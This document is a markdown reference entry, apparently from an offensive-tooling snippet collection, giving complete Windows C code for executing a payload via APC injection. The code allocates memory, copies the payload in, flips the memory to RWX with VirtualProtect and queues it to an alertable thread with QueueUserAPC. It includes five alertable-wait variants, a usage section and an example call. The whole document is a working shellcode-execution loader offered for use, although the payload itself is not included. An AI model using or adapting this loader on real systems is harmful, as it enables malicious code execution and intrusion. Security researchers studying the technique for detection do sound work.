## APC Injection via Alertable Thread

Executes a payload via APC injection using an alertable thread. The thread is created running one of the `AlertableFunction` variants which place the thread in a wait state where queued APCs fire immediately upon scheduling. `RunViaApcInjection` allocates a `RW` region, copies the payload in, flips protection to `RWX` with `VirtualProtect`, and queues the payload's base address to the alertable thread via `QueueUserAPC`.

**Usage**

Uncomment one `AlertableFunction` variant and pass its address to `CreateThread`. Call `RunViaApcInjection` with the returned handle, the payload buffer, and its size. Create the thread with no creation flags so it starts immediately and enters the alertable state before the APC is queued.

- `IN HANDLE hThread`  Handle to a thread running one of the `AlertableFunction` variants in an alertable wait state.
- `IN PBYTE pPayload`  Base address of the payload buffer to execute.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the APC was successfully queued, otherwise `FALSE`.

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


// -----------------------------------------------------------------------
// Uncomment ONE of the following AlertableFunction variants.
// Each places the thread in an alertable wait state using a different API.
// -----------------------------------------------------------------------

// Uses SleepEx — simplest option, no event handle required.
VOID AlertableFunction1() {
    SleepEx(INFINITE, TRUE);        // bAlertable must be TRUE.
}

// Uses WaitForSingleObjectEx with a dummy event.
// VOID AlertableFunction2() {
//     HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
//     if (hEvent) {
//         WaitForSingleObjectEx(
//             hEvent,     // Dummy event — never signaled.
//             INFINITE,   // Wait indefinitely.
//             TRUE        // bAlertable must be TRUE.
//         );
//         CloseHandle(hEvent);
//     }
// }

// Uses WaitForMultipleObjectsEx with a dummy event.
// VOID AlertableFunction3() {
//     HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
//     if (hEvent) {
//         WaitForMultipleObjectsEx(
//             1,          // Number of handles in the array.
//             &hEvent,    // Dummy event array.
//             TRUE,       // Wait for all objects.
//             INFINITE,   // Wait indefinitely.
//             TRUE        // bAlertable must be TRUE.
//         );
//         CloseHandle(hEvent);
//     }
// }

// Uses MsgWaitForMultipleObjectsEx with a dummy event.
// VOID AlertableFunction4() {
//     HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
//     if (hEvent) {
//         MsgWaitForMultipleObjectsEx(
//             1,              // Number of handles in the array.
//             &hEvent,        // Dummy event array.
//             INFINITE,       // Wait indefinitely.
//             QS_KEY,         // Wake on keyboard input.
//             MWMO_ALERTABLE  // dwFlags must include MWMO_ALERTABLE.
//         );
//         CloseHandle(hEvent);
//     }
// }

// Uses SignalObjectAndWait with two dummy events.
// VOID AlertableFunction5() {
//     HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
//     HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
//     if (hEvent1 && hEvent2) {
//         SignalObjectAndWait(
//             hEvent1,    // Object to signal — dummy event.
//             hEvent2,    // Object to wait on — dummy event.
//             INFINITE,   // Wait indefinitely.
//             TRUE        // bAlertable must be TRUE.
//         );
//         CloseHandle(hEvent1);
//         CloseHandle(hEvent2);
//     }
// }


BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID   pAddress        = NULL;
    DWORD   dwOldProtection = NULL;

    // Allocate RW memory to hold the payload before making it executable.
    pAddress = VirtualAlloc(
        NULL,                       // Let the OS choose the base address.
        sPayloadSize,               // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE,   // Reserve and commit pages in one call.
        PAGE_READWRITE              // RW only at allocation time; execute is added later.
    );
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Copy the payload into the allocated region.
    memcpy(pAddress, pPayload, sPayloadSize);

    printf("\t[i] Payload Written To : 0x%p \n", pAddress);

    // Flip the memory protection from RW to RWX so the payload can execute.
    if (!VirtualProtect(
        pAddress,               // Base address of the region to modify.
        sPayloadSize,           // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE, // New protection: read, write, and execute.
        &dwOldProtection        // Receives the previous protection value.
    )) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[#] Press <Enter> To Run ... ");
    getchar();

    // Queue the payload to the alertable thread as an APC function.
    // The payload fires immediately when the thread is next scheduled.
    if (!QueueUserAPC(
        (PAPCFUNC)pAddress, // Address of the APC function — payload base address.
        hThread,            // Handle to the alertable target thread.
        NULL                // No parameter passed to the APC function.
    )) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

**Example**

```c
HANDLE  hThread     = NULL;
DWORD   dwThreadId  = NULL;

// Create the thread using whichever AlertableFunction variant is uncommented above.
hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&AlertableFunction1, NULL, 0, &dwThreadId);

// Queue the payload — fires immediately when the alertable thread is scheduled.
RunViaApcInjection(hThread, pPayload, sPayloadSize);

WaitForSingleObject(hThread, INFINITE);
```
